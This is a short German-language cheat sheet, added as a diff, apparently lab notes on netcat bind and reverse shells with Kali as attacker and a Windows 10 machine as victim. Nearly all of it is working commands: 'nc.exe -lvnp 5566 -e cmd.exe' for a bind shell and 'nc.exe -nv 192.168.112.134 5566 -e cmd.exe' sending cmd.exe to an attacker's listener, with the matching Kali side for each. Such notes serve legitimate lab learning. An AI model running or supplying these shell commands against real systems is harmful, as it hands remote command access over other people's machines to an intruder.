@@ -1,0 +1,30 @@
+Reverse & Bind Shell
+
+#Bind Shell (Angreifer Kali, Opfer W10):
+
+Windows CMD: nc.exe -nvlp <Port> -e cmd.exe (Damit wird auf Windows-Seite auf eine Initialisierung der Shell gewartet)
+
+Kali Terminal: 
+
+nc -nv <Windows IP> <Port> (Verbindung wird hergestellt und Zugriff auf CMD ist möglich)
+
+Also...:
+
+nc.exe -lvnp 5566 -e cmd.exe
+
+nc -nv 172.17.101.99 5566
+
+_________________________________________________________________________________________________________________________________
+
+
+#Reverse Shell (Angreifer Kali, Opfer W10)
+
+Windows CMD: nc.exe -nv <Kali-IP> <Port> -e cmd.exe (Angreifer IP und Port muss eingetragen werden, damit Angreifer sich verbinden kann)
+
+Kali Terminal: nc -lvnp <Port> (Wartet mit Listener auf Verbindung der Shell, danach sind Befehle möglich)
+
+Also...:
+
+nc.exe -nv 192.168.112.134 5566 -e cmd.exe
+
+nc -lvnp 5566
